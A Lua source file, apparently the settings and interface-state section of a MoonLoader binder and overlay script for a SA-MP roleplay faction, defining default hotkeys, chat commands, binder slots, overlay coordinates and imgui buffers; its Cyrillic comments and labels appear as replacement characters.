local squadsize = 15.0
local inicfg = require 'inicfg'
local regex = require 'rex_pcre'
local bass = require "lib.bass"
local memory = require 'memory'
local vkeys = require 'vkeys'
local imgui = require 'imgui'
local encoding = require 'encoding'
local ffi = require 'ffi'
local ev = require 'lib.samp.events'
local pie = require 'imgui_piemenu'
local rkeys = require 'rkeys'
local lfs = require 'lfs'
local dlstatus = require('moonloader').download_status
imgui.ToggleButton = require('imgui_addons').ToggleButton
encoding.default = 'CP1251'
u8 = encoding.UTF8
local V = 1.92

ffi.cdef[[
int SendMessageA(int, int, int, int);
unsigned int GetModuleHandleA(const char* lpModuleName);
short GetKeyState(int nVirtKey);
bool GetKeyboardLayoutNameA(char* pwszKLID);
int GetLocaleInfoA(int Locale, int LCType, char* lpLCData, int cchData);
]]

----- ��������� ������
local def_ini = {
		HotKey = {
				[1] = "0", [2] = "0", [3] = "0", [4] = "0", [5] = "0", [6] = "0", [7] = "0", [8] = "0", [9] = "0", [10] = "0", -- 1 �����, 2 - ���� ������, 3 ���� ��������, 4 ����������� �������, 5 �������� �������, 6 ���������� �� ���������, 7 ���������� ������������, 8 �������� ����, 9 �������� ������, 10 ���� �����
				[11] = "0", [12] = "0", [13] = "0", [14] = "0", [15] = "0", [16] = "0", [17] = "0", [18] = "0", [19] = "0", [20] = "0", -- 11 �������, 12 �������������, 13 - /lock, 14 - �� ������������, 15 �� ������������, 16 - �� ������������, 17 - �� ������������, 18 - �� ������������, 19 ����� ������ � members, 20 ������� ����� �.,
				[21] = "0", [22] = "0", [23] = "0", [24] = "0", [25] = "0", [26] = "0", [27] = "0", [28] = "0", [29] = "0", [30] = "0", -- 21 ���� ������� � �����, 22 ������� ������ ������, 23 ���� ��������, 24 - �� ������������, 25 ��, 26 ������� �����, 27-30 ���������
				[31] = "0", [32] = "0", [33] = "0", [34] = "0", [35] = "0", [36] = "0", [37] = "0", [38] = "0", [39] = "0", [40] = "0", -- 31-37 ���������, 38-40 - �� ������������
				[41] = "0", [42] = "0", [43] = "0", [44] = "0" -- 41 ������� ������� ��������, 42 ��������� �����, 43 ��������� �������, 44 - piemenu
		},

		Commands = {
				[1] = "ob", [2] = "sopr", [3] = "zgruz", [4] = "rgruz", [5] = "bgruz", [6] = "kv", [7] = "e", [8] = "", [9] = "r", [10] = "pr",
				[11] = "hey", [12] = "gr", [13] = "hit", [14] = "cl", [15] = "rk", [16] = "memb", [17] = "chs", [18] = "mp", [19] = "z", [20] = "mem1",
				[21] = "sw", [22] = "st", [23] = "", [24] = "", [25] = "afk", [26] = "", [27] = "mcall", [28] = "showp", [29] = ""
		},

		UserBinder = {
				[1] = "", [2] = "", [3] = "", [4] = "", [5] = "", [6] = "", [7] = "", [8] = "", [9] = "", [10] = "",
				[11] = "",
		},

		UserCBinder = {
				[1] = "", [2] = "", [3] = "", [4] = "", [5] = "", [6] = "", [7] = "", [8] = "", [9] = "", [10] = "",
				[11] = "", [12] = "", [13] = "", [14] = ""
		},

		UserCBinderC = {
				[1] = "", [2] = "", [3] = "", [4] = "", [5] = "", [6] = "", [7] = "", [8] = "", [9] = "", [10] = "",
				[11] = "", [12] = "", [13] = "", [14] = ""
		},

		UserPieMenuNames = {[1] = "", [2] = "", [3] = "", [4] = "", [5] = "", [6] = "", [7] = "", [8] = "", [9] = "", [10] = ""},

		UserPieMenuActions = {[1] = "", [2] = "", [3] = "", [4] = "", [5] = "", [6] = "", [7] = "", [8] = "", [9] = "", [10] = ""},

		UserClist = {
				[1] = "������� �1", [2] = "������� �2", [3] = "������� �3", [4] = "������� �4",
				[5] = "������� �5", [6] = "������� �6", [7] = "������� �7", [8] = "������� �8", [9] = "������� �9",
				[10] = "������� �10", [11] = "������� �11", [12] = "���������� ����� \"�.�.�.�.\"", [13] = "������� �13", [14] = "������� �14",
				[15] = "������� �15", [16] = "������� �16", [17] = "������� �17", [18] = "������� �18", [19] = "������� �19",
				[20] = "������� �20", [21] = "������� �21", [22] = "������� �22", [23] = "������� �23", [24] = "������� �24",
				[25] = "������� �25", [26] = "������� �26", [27] = "������� �27", [28] = "������� �28", [29] = "������� �29",
				[30] = "������� �30", [31] = "������� �31", [32] = "������� �32", [33] = "������� �33"
		},
		
		UserGun = {
			[1] = "����������� �������� \"SD Pistol\"", [2] = "�������� \"Desert Eagle\"", [3] = "�������� \"Shotgun\"", [4] = "��������-������� \"HK MP-5\"",
			[5] = "��������� �������� \"M4A1\"", [6] = "��������� �������� \"AK-47\"", [7] = "����������� �������� \"Country Rifle\""
		},

		bools = {
				[1] = 0, [2] = 0, [3] = 0, [4] = 0, [5] = 0, [6] = 0, [7] = 0, [8] = 0, [9] = 0, [10] = 0, -- 1 �� ������������, 2 - ��������� �������� �� ��, 3 - �������� ����������� � "������� �����", 4 - 10 ����� � ���� ������
				[11] = 0, [12] = 0, [13] = 0, [14] = 0, [15] = 0, [16] = 0, [17] = 0, [18] = 0, [19] = 0, [20] = 0, -- 11 - 14 - ����� � ���� �������, 15 - ������� �� �����, 16-17 �� �����������, 18 ����� ���� � ������, 19 - ����� ��� � ������, 20 - ����� ��� � ������
				[21] = 0, [22] = 0, [23] = 0, [24] = 0, [25] = 0, [26] = 0, [27] = 0, [28] = 0, [29] = 0, [30] = 0, -- 21 - ����� �4 � ������, 22 - ����� ����� � ������, 23 - ����� ������� � ������, 24 - ���������� ������ �� ������, 25 - ��������� overlay, 26 - ���. �����, 27 - ���� ��� � id, 28 - ���� � ���. ����������, 29 - ��, 30 - ���,
				[31] = 0, [32] = 0, [33] = 0, [34] = 0, [35] = 0, [36] = 0, [37] = 0, [38] = 0, [39] = 0, [40] = 0, -- 31 - � �������, 32 - �� � �����, 33 - ��� ����������, 34 - ���� � �����, 35 - ������������, 36 - �� �����, 37 - ���������, 38 - ����� ��������, 39 - ��������� ���� � �����, 40 - �������� ������� �� ���������� ���� � �����
				[41] = 0, [42] = 0, [43] = 0, [44] = 0, [45] = 0, [46] = 0, [47] = 0, [48] = 0, [49] = 0, [50] = 0, -- 41 - ��������� ������, 42 - ������������� ����� � ���������, 43 - �������� +500, 44 - ���������� � ���������� �����, 45 - ����, 46 - �������� � ������� ��, 47 - ���������� ������������, 48 ���������� ����, 49 ��������� �������� ������, 50 - ��������� �������� �����/������, 
				[51] = 0, [52] = 0, [53] = 0, [54] = 0, [55] = 0, [56] = 0, [57] = 0, [58] = 0, [59] = 0, [60] = 0, -- 51 - ��������� ����������� ���������, 52 - ���������� ������� �����, 53 - �������������� �������� �� ���, 54 - ������ ������ � ��������, 55 - /q ��������, 56 - ������������ ������� ���� � ����, 57 - �������������� ��������������, 58 - �������� ������� ����� ������, 59 - ������������
				[61] = 0, [62] = 0, [63] = 0, [64] = 0, [65] = 0, [66] = 0, [67] = 0, [68] = 0, [69] = 0, [70] = 0,
				[71] = 0, [72] = 0, [73] = 0, [74] = 0, [75] = 0, [76] = 0, [77] = 0, [78] = 0, [79] = 0, [80] = 0
		},

		rphr = {
				[1] = "", [2] = "", [3] = "", [4] = "", [5] = "", [6] = "", [7] = "", [8] = "", [9] = "", [10] = ""
		},

		warnings = {
				[1] = "", [2] = "", [3] = "", [4] = ""
		},

		ovCoords = {
				["show_timeX"] = 1551, ["show_timeY"] = 18,
				["show_placeX"] = 48, ["show_placeY"] = 796,
				["show_nameX"] = 48, ["show_nameY"] = 1020,
				["show_vehX"] = 1163, ["show_vehY"] = 1024,
				["show_targetImageX"] = 998, ["show_targetImageY"] = 332,
				["show_hpX"] = 1628, ["show_hpY"] = 85,
				["crosCarX"] = 800, ["crosCarY"] = 600,
				["show_rkX"] = 326, ["show_rkY"] = 822,
				["show_afkX"] = 326, ["show_afkY"] = 852,
				["show_tecinfoX"] = 1135, ["show_tecinfoY"] = 668,
				["show_squadX"] = 50, ["show_squadY"] = 500,
				["show_500X"] = 1620, ["show_500Y"] = 780,
				["show_dindX"] = 326, ["show_dindY"] = 952,
				["show_damX"] = 200, ["show_damY"] = 200,
				["show_deathX"] = 326, ["show_deathY"] = 792,
				["show_moneyX"] = 1574, ["show_moneyY"] = 28,
		},

		Settings = {["PlayerRank"] = "", ["PlayerSecondName"] = "", ["UserSex"] = 0, ["PlayerFirstName"] = "", ["PlayerU"] = "�.�.�.�.", ["tag"] = "|| �.�.�.�. ||", ["useclist"] = "12", ["timep"] = "0"},
		
		plus500 = {[1] = "FF00FF", [2] = "54", [3] = "times"},
		
		squadset = {[1] = "FF00FF", [2] = "15", [3] = "arial"},

		fondset = {[1] = "b30000", [2] = "00FF00"},

		dial = {[1] = "10000", [2] = "5000", [3] = "3000", [4] = "3000"}
}
local def_bl = {nicks = {}}
local blarr = inicfg.load(def_bl, "bl")
local config_ini = inicfg.load(def_ini, "config") -- ��������� ���
-- �������� ���������
local PlayerU = config_ini.Settings.PlayerU
local tag = config_ini.Settings.tag
local RP = config_ini.Settings.UserSex == 1 and "a" or ""
local useclist = config_ini.Settings.useclist


----- ����������� ����������
-- ������ �����������
local alevel = -1
local skipresponse = -1
local pedskol = 0
-- Imgui
local guis = {["mainw"] = imgui.ImBool(false), ["updatestatus"] = {["status"] = imgui.ImBool(false), ["wn"] = {}}}
local maintabs = {
		tab_main_binds = {
				["status"] = true, ["first"] = true, ["clistparams"] = false, ["gunparams"] = imgui.ImBool(false),
		},

		tab_user_binds = {
				["status"] = false, ["hk"] = true, ["cmd"] = false, ["pie"] = false
		},

		tab_bbot = {
				["status"] = false
		},

		tab_commands = {
				["status"] = false, ["first"] = true, ["second"] = false, ["help"] = imgui.ImBool(false), ["money"] = imgui.ImBool(false)
		},

		tab_overlay = {
				["status"] = false
		},

		tab_settings = {
				["status"] = false
		},

		user_keys = {
				["status"] = imgui.ImBool(false)
		},

		rphr = {
				["status"] = imgui.ImBool(false)
		},

		auto_bp = {
				["status"] = imgui.ImBool(false)
		},

		warnings = {
				["status"] = imgui.ImBool(false)
		},
		
		pl500 = {
				["status"] = imgui.ImBool(false)
		},
		
		squad = {
				["status"] = imgui.ImBool(false)
		},

		tab_skipd = {
			["status"] = imgui.ImBool(false)
		},
		
}
local suspendkeys = 2 -- 0 ������ ��������, 1 -- ������ ��������� -- 2 ������ ���������� ��������
local guibuffers = {
		clistparams = {
				["clist1"] = imgui.ImBuffer(u8(config_ini.UserClist[1]), 256), ["clist2"] = imgui.ImBuffer(u8(config_ini.UserClist[2]), 256), ["clist3"] = imgui.ImBuffer(u8(config_ini.UserClist[3]), 256),
				["clist4"] = imgui.ImBuffer(u8(config_ini.UserClist[4]), 256), ["clist5"] = imgui.ImBuffer(u8(config_ini.UserClist[5]), 256), ["clist6"] = imgui.ImBuffer(u8(config_ini.UserClist[6]), 256),
				["clist7"] = imgui.ImBuffer(u8(config_ini.UserClist[7]), 256), ["clist8"] = imgui.ImBuffer(u8(config_ini.UserClist[8]), 256), ["clist9"] = imgui.ImBuffer(u8(config_ini.UserClist[9]), 256),
				["clist10"] = imgui.ImBuffer(u8(config_ini.UserClist[10]), 256), ["clist11"] = imgui.ImBuffer(u8(config_ini.UserClist[11]), 256), ["clist12"] = imgui.ImBuffer(u8(config_ini.UserClist[12]), 256),
				["clist13"] = imgui.ImBuffer(u8(config_ini.UserClist[13]), 256), ["clist14"] = imgui.ImBuffer(u8(config_ini.UserClist[14]), 256), ["clist15"] = imgui.ImBuffer(u8(config_ini.UserClist[15]), 256),
				["clist16"] = imgui.ImBuffer(u8(config_ini.UserClist[16]), 256), ["clist17"] = imgui.ImBuffer(u8(config_ini.UserClist[17]), 256), ["clist18"] = imgui.ImBuffer(u8(config_ini.UserClist[18]), 256),
				["clist19"] = imgui.ImBuffer(u8(config_ini.UserClist[19]), 256), ["clist20"] = imgui.ImBuffer(u8(config_ini.UserClist[20]), 256), ["clist21"] = imgui.ImBuffer(u8(config_ini.UserClist[21]), 256),
				["clist22"] = imgui.ImBuffer(u8(config_ini.UserClist[22]), 256), ["clist23"] = imgui.ImBuffer(u8(config_ini.UserClist[23]), 256), ["clist24"] = imgui.ImBuffer(u8(config_ini.UserClist[24]), 256),
				["clist25"] = imgui.ImBuffer(u8(config_ini.UserClist[25]), 256), ["clist26"] = imgui.ImBuffer(u8(config_ini.UserClist[26]), 256), ["clist27"] = imgui.ImBuffer(u8(config_ini.UserClist[27]), 256),
				["clist28"] = imgui.ImBuffer(u8(config_ini.UserClist[28]), 256), ["clist29"] = imgui.ImBuffer(u8(config_ini.UserClist[29]), 256), ["clist30"] = imgui.ImBuffer(u8(config_ini.UserClist[30]), 256),
				["clist31"] = imgui.ImBuffer(u8(config_ini.UserClist[31]), 256), ["clist32"] = imgui.ImBuffer(u8(config_ini.UserClist[32]), 256), ["clist33"] = imgui.ImBuffer(u8(config_ini.UserClist[33]), 256)
		},
		
		gunparams = {
			["gun1"] = imgui.ImBuffer(u8(config_ini.UserGun[1]), 256), ["gun2"] = imgui.ImBuffer(u8(config_ini.UserGun[2]), 256), ["gun3"] = imgui.ImBuffer(u8(config_ini.UserGun[3]), 256),
			["gun4"] = imgui.ImBuffer(u8(config_ini.UserGun[4]), 256), ["gun5"] = imgui.ImBuffer(u8(config_ini.UserGun[5]), 256), ["gun6"] = imgui.ImBuffer(u8(config_ini.UserGun[6]), 256),
			["gun7"] = imgui.ImBuffer(u8(config_ini.UserGun[7]), 256)
		},

		ubinds = {
				["bind1"] = imgui.ImBuffer(u8(config_ini.UserBinder[1]), 512), ["bind2"] = imgui.ImBuffer(u8(config_ini.UserBinder[2]), 512), ["bind3"] = imgui.ImBuffer(u8(config_ini.UserBinder[3]), 512),
				["bind4"] = imgui.ImBuffer(u8(config_ini.UserBinder[4]), 512), ["bind5"] = imgui.ImBuffer(u8(config_ini.UserBinder[5]), 512), ["bind6"] = imgui.ImBuffer(u8(config_ini.UserBinder[6]), 512),
				["bind7"] = imgui.ImBuffer(u8(config_ini.UserBinder[7]), 512), ["bind8"] = imgui.ImBuffer(u8(config_ini.UserBinder[8]), 512), ["bind9"] = imgui.ImBuffer(u8(config_ini.UserBinder[9]), 512),
				["bind10"] = imgui.ImBuffer(u8(config_ini.UserBinder[10]), 512), ["bind11"] = imgui.ImBuffer(u8(config_ini.UserBinder[11]), 512)
		},

		ucbinds = {
				["bind1"] = imgui.ImBuffer(u8(config_ini.UserCBinder[1]), 512), ["bind2"] = imgui.ImBuffer(u8(config_ini.UserCBinder[2]), 512), ["bind3"] = imgui.ImBuffer(u8(config_ini.UserCBinder[3]), 512),
				["bind4"] = imgui.ImBuffer(u8(config_ini.UserCBinder[4]), 512), ["bind5"] = imgui.ImBuffer(u8(config_ini.UserCBinder[5]), 512), ["bind6"] = imgui.ImBuffer(u8(config_ini.UserCBinder[6]), 512),
				["bind7"] = imgui.ImBuffer(u8(config_ini.UserCBinder[7]), 512), ["bind8"] = imgui.ImBuffer(u8(config_ini.UserCBinder[8]), 512), ["bind9"] = imgui.ImBuffer(u8(config_ini.UserCBinder[9]), 512),
				["bind10"] = imgui.ImBuffer(u8(config_ini.UserCBinder[10]), 512),["bind11"] = imgui.ImBuffer(u8(config_ini.UserCBinder[11]), 512), ["bind12"] = imgui.ImBuffer(u8(config_ini.UserCBinder[12]), 512),
				["bind13"] = imgui.ImBuffer(u8(config_ini.UserCBinder[13]), 512), ["bind14"] = imgui.ImBuffer(u8(config_ini.UserCBinder[14]), 512)
		},

		ucbindsc = {
				["bind1"] = imgui.ImBuffer(u8(config_ini.UserCBinderC[1]), 512), ["bind2"] = imgui.ImBuffer(u8(config_ini.UserCBinderC[2]), 512), ["bind3"] = imgui.ImBuffer(u8(config_ini.UserCBinderC[3]), 512),
				["bind4"] = imgui.ImBuffer(u8(config_ini.UserCBinderC[4]), 512), ["bind5"] = imgui.ImBuffer(u8(config_ini.UserCBinderC[5]), 512), ["bind6"] = imgui.ImBuffer(u8(config_ini.UserCBinderC[6]), 512),
				["bind7"] = imgui.ImBuffer(u8(config_ini.UserCBinderC[7]), 512), ["bind8"] = imgui.ImBuffer(u8(config_ini.UserCBinderC[8]), 512), ["bind9"] = imgui.ImBuffer(u8(config_ini.UserCBinderC[9]), 512),
				["bind10"] = imgui.ImBuffer(u8(config_ini.UserCBinderC[10]), 512), ["bind11"] = imgui.ImBuffer(u8(config_ini.UserCBinderC[11]), 512), ["bind12"] = imgui.ImBuffer(u8(config_ini.UserCBinderC[12]), 512),
				["bind13"] = imgui.ImBuffer(u8(config_ini.UserCBinderC[13]), 512), ["bind14"] = imgui.ImBuffer(u8(config_ini.UserCBinderC[14]), 512)
		},

		rphr = {
				["bind1"] = imgui.ImBuffer(u8(config_ini.rphr[1]), 256), ["bind2"] = imgui.ImBuffer(u8(config_ini.rphr[2]), 256), ["bind3"] = imgui.ImBuffer(u8(config_ini.rphr[3]), 256),
				["bind4"] = imgui.ImBuffer(u8(config_ini.rphr[4]), 256), ["bind5"] = imgui.ImBuffer(u8(config_ini.rphr[5]), 256), ["bind6"] = imgui.ImBuffer(u8(config_ini.rphr[6]), 256),
				["bind7"] = imgui.ImBuffer(u8(config_ini.rphr[7]), 256), ["bind8"] = imgui.ImBuffer(u8(config_ini.rphr[8]), 256), ["bind9"] = imgui.ImBuffer(u8(config_ini.rphr[9]), 256),
				["bind10"] = imgui.ImBuffer(u8(config_ini.rphr[10]), 256)
		},

		settings = {
				["fname"] = imgui.ImBuffer(u8(config_ini.Settings.PlayerFirstName), 256), ["sname"] = imgui.ImBuffer(u8(config_ini.Settings.PlayerSecondName), 256), 
				["rank"] = imgui.ImBuffer(u8(config_ini.Settings.PlayerRank), 256), ["PlayerU"] = imgui.ImBuffer(u8(config_ini.Settings.PlayerU), 256),
				["useclist"] = imgui.ImBuffer(u8(config_ini.Settings.useclist), 256), ["tag"] = imgui.ImBuffer(u8(config_ini.Settings.tag), 256), ["timep"] = imgui.ImBuffer(u8(config_ini.Settings.timep), 256), 
		},

		commands = {
				["command1"] = imgui.ImBuffer(u8(config_ini.Commands[1]), 256), ["command2"] = imgui.ImBuffer(u8(config_ini.Commands[2]), 256), ["command3"] = imgui.ImBuffer(u8(config_ini.Commands[3]), 256),
				["command4"] = imgui.ImBuffer(u8(config_ini.Commands[4]), 256), ["command5"] = imgui.ImBuffer(u8(config_ini.Commands[5]), 256), ["command6"] = imgui.ImBuffer(u8(config_ini.Commands[6]), 256),
				["command7"] = imgui.ImBuffer(u8(config_ini.Commands[7]), 256), ["command8"] = imgui.ImBuffer(u8(config_ini.Commands[8]), 256), ["command9"] = imgui.ImBuffer(u8(config_ini.Commands[9]), 256),
				["command10"] = imgui.ImBuffer(u8(config_ini.Commands[10]), 256), ["command11"] = imgui.ImBuffer(u8(config_ini.Commands[11]), 256), ["command12"] = imgui.ImBuffer(u8(config_ini.Commands[12]), 256),
				["command13"] = imgui.ImBuffer(u8(config_ini.Commands[13]), 256), ["command14"] = imgui.ImBuffer(u8(config_ini.Commands[14]), 256), ["command15"] = imgui.ImBuffer(u8(config_ini.Commands[15]), 256),
				["command16"] = imgui.ImBuffer(u8(config_ini.Commands[16]), 256), ["command17"] = imgui.ImBuffer(u8(config_ini.Commands[17]), 256), ["command18"] = imgui.ImBuffer(u8(config_ini.Commands[18]), 256),
				["command19"] = imgui.ImBuffer(u8(config_ini.Commands[19]), 256), ["command20"] = imgui.ImBuffer(u8(config_ini.Commands[20]), 256), ["command21"] = imgui.ImBuffer(u8(config_ini.Commands[21]), 256),
				["command22"] = imgui.ImBuffer(u8(config_ini.Commands[22]), 256), ["command23"] = imgui.ImBuffer(u8(config_ini.Commands[23]), 256), ["command24"] = imgui.ImBuffer(u8(config_ini.Commands[24]), 256),
				["command25"] = imgui.ImBuffer(u8(config_ini.Commands[25]), 256), ["command26"] = imgui.ImBuffer(u8(config_ini.Commands[26]), 256), ["command27"] = imgui.ImBuffer(u8(config_ini.Commands[27]), 256),
				["command28"] = imgui.ImBuffer(u8(config_ini.Commands[28]), 256), ["command29"] = imgui.ImBuffer(u8(config_ini.Commands[29]), 256)
		},

		warnings = {
			["war1"] = imgui.ImBuffer(u8(config_ini.warnings[1]), 256),
			["war2"] = imgui.ImBuffer(u8(config_ini.warnings[2]), 256),
			["war3"] = imgui.ImBuffer(u8(config_ini.warnings[3]), 256),
			["war4"] = imgui.ImBuffer(u8(config_ini.warnings[4]), 256),
		},

		UserPieMenu = {
				names = {
						["name1"] = imgui.ImBuffer(u8(config_ini.UserPieMenuNames[1]), 256), ["name2"] = imgui.ImBuffer(u8(config_ini.UserPieMenuNames[2]), 256), ["name3"] = imgui.ImBuffer(u8(config_ini.UserPieMenuNames[3]), 256),
						["name4"] = imgui.ImBuffer(u8(config_ini.UserPieMenuNames[4]), 256), ["name5"] = imgui.ImBuffer(u8(config_ini.UserPieMenuNames[5]), 256), ["name6"] = imgui.ImBuffer(u8(config_ini.UserPieMenuNames[6]), 256),
						["name7"] = imgui.ImBuffer(u8(config_ini.UserPieMenuNames[7]), 256), ["name8"] = imgui.ImBuffer(u8(config_ini.UserPieMenuNames[8]), 256), ["name9"] = imgui.ImBuffer(u8(config_ini.UserPieMenuNames[9]), 256),
						["name10"] = imgui.ImBuffer(u8(config_ini.UserPieMenuNames[10]), 256)
				},

				actions = {
						["action1"] = imgui.ImBuffer(u8(config_ini.UserPieMenuActions[1]), 256), ["action2"] = imgui.ImBuffer(u8(config_ini.UserPieMenuActions[2]), 256), ["action3"] = imgui.ImBuffer(u8(config_ini.UserPieMenuActions[3]), 256),
						["action4"] = imgui.ImBuffer(u8(config_ini.UserPieMenuActions[4]), 256), ["action5"] = imgui.ImBuffer(u8(config_ini.UserPieMenuActions[5]), 256), ["action6"] = imgui.ImBuffer(u8(config_ini.UserPieMenuActions[6]), 256),
						["action7"] = imgui.ImBuffer(u8(config_ini.UserPieMenuActions[7]), 256), ["action8"] = imgui.ImBuffer(u8(config_ini.UserPieMenuActions[8]), 256), ["action9"] = imgui.ImBuffer(u8(config_ini.UserPieMenuActions[9]), 256),
						["action10"] = imgui.ImBuffer(u8(config_ini.UserPieMenuActions[10]), 256)
				}
		},
		
		plus500 = {
			["plus500color"] = imgui.ImBuffer(u8(config_ini.plus500[1]), 256), ["plus500size"] = imgui.ImBuffer(u8(config_ini.plus500[2]), 256), ["plus500font"] = imgui.ImBuffer(u8(config_ini.plus500[3]), 256),

		},
		
		squad = {
			["fscolor"] = imgui.ImBuffer(u8(config_ini.squadset[1]), 256), ["size"] = imgui.ImBuffer(u8(config_ini.squadset[2]), 256), ["font"] = imgui.ImBuffer(u8(config_ini.squadset[3]), 256),
		},

		fond = {
			["fondcolor"] = imgui.ImBuffer(u8(config_ini.fondset[1]), 256), ["mycolor"] = imgui.ImBuffer(u8(config_ini.fondset[2]), 256), 
		},

		dial = {
			["med"] = imgui.ImBuffer(u8(config_ini.dial[1]), 256), ["rem"] = imgui.ImBuffer(u8(config_ini.dial[2]), 256), ["meh"] = imgui.ImBuffer(u8(config_ini.dial[3]), 256), ["azs"] = imgui.ImBuffer(u8(config_ini.dial[4]), 256),
		}
}

local togglebools = {
		tab_main_binds = {
				first = {
				
				},

				clistparams = {
						[1] = config_ini.bools[2] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
						[2] = config_ini.bools[3] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
				}
		},

		tab_user_binds = {
				hk = {
					[1] = config_ini.bools[4] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
					[2] = config_ini.bools[5] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
					[3] = config_ini.bools[6] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
					[4] = config_ini.bools[7] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
					[5] = config_ini.bools[8] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
					[6] = config_ini.bools[9] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
					[7] = config_ini.bools[10] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
					[8] = config_ini.bools[11] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
					[9] = config_ini.bools[12] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
					[10] = config_ini.bools[13] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
					[11] = config_ini.bools[14] == 1 and imgui.ImBool(true) or imgui.ImBool(false)
				},

				cmd = {

				}
		},

		tab_bbot = {
			[1] = config_ini.bools[39] == 1 and imgui.ImBool(true) or imgui.ImBool(false), 
			[2] = config_ini.bools[40] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
			[3] = config_ini.bools[42] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
			[4] = config_ini.bools[55] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
			[5] = config_ini.bools[56] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
			[6] = config_ini.bools[15] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
			[7] = config_ini.bools[57] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
			[8] = config_ini.bools[59] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
		},

		tab_commands = {

		},

		tab_settings = {
			[1] = config_ini.Settings.UserSex == 1 and imgui.ImBool(true) or imgui.ImBool(false),
		},

		user_keys = {

		},

		rphr = {

		},

		auto_bp = {
				[1] = config_ini.bools[18] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
				[2] = config_ini.bools[19] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
				[3] = config_ini.bools[20] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
				[4] = config_ini.bools[21] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
				[5] = config_ini.bools[22] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
				[6] = config_ini.bools[23] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
				[7] = config_ini.bools[24] == 1 and imgui.ImBool(true) or imgui.ImBool(false)
		},

		tab_overlay = {
				[1] = config_ini.bools[25] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
				[2] = config_ini.bools[26] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
				[3] = config_ini.bools[27] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
				[4] = config_ini.bools[28] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
				[5] = config_ini.bools[29] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
				[6] = config_ini.bools[30] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
				[7] = config_ini.bools[31] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
				[8] = config_ini.bools[32] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
				[9] = config_ini.bools[33] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
				[10] = config_ini.bools[34] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
				[11] = config_ini.bools[35] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
				[12] = config_ini.bools[36] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
				[13] = config_ini.bools[37] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
				[14] = config_ini.bools[38] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
				[15] = config_ini.bools[41] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
				[16] = config_ini.bools[43] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
				[17] = config_ini.bools[44] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
				[18] = config_ini.bools[52] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
				[19] = config_ini.bools[54] == 1 and imgui.ImBool(true) or imgui.ImBool(false)
		},

		tab_skipd = {
			[1] = config_ini.bools[45] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
			[2] = config_ini.bools[46] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
			[3] = config_ini.bools[47] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
			[4] = config_ini.bools[48] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
			[5] = config_ini.bools[49] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
			[6] = config_ini.bools[50] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
			[7] = config_ini.bools[51] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
			[8] = config_ini.bools[53] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
		},

		tab_moder = {
			[1] = config_ini.bools[58] == 1 and imgui.ImBool(true) or imgui.ImBool(false)
		},
}
-- �������
-- ���������
local show = {
		show_time = imgui.ImBool(true),
		show_place = imgui.ImBool(true),
		show_name = imgui.ImBool(true),
		show_veh = imgui.ImBool(true),
		show_target = imgui.ImBool(true),
		show_hp = imgui.ImBool(true),
		show_rk = imgui.ImBool(true),
		show_death = imgui.ImBool(true),
		show_tecinfo = imgui.ImBool(true),
		show_afk = imgui.ImBool(true),
		show_carhp  = imgui.ImBool(true),
		show_anticrash = imgui.ImBool(true),
		show_squad = imgui.ImBool(true),
		show_500 = {["time500"] = 0, ["mult500"] = 1, ["bool500"] = imgui.ImBool(false)},
		show_dmind = {["bool"] = imgui.ImBool(true), ["damind"] = {["a_index"] = 0, ["shots"] = {[1] = 0, [23] = 0, [24] = 0, [25] = 0, [29] = 0, [30] = 0, [31] = 0, [33] = 0}, ["hits"] = {[1] = 0, [23] = 0, [24] = 0, [25] = 0, [29] = 0, [30] = 0, [31] = 0, [33] = 0}, ["damage"] = {[1] = 0, [23] = 0, [24] = 0, [25] = 0, [29] = 0, [30] = 0, [31] = 0, [33] = 0}}},
		othervars = {["saccess"] = false},
		show_dam = imgui.ImBool(true),
		show_fond = imgui.ImBool(true),
		rand = 0,
		show_mem1 = imgui.ImBool(false),
}
-- ���������� �������
local SetModeCond = 4 -- ��� ��� �����  �������� � 0 ���� ������ ����� �� ��� ������� �������� ������. ���� �� ������ ������ 4.
local SetMode = false -- ����� ���������� �� ��������� � ������ ������
-- ����� ��������
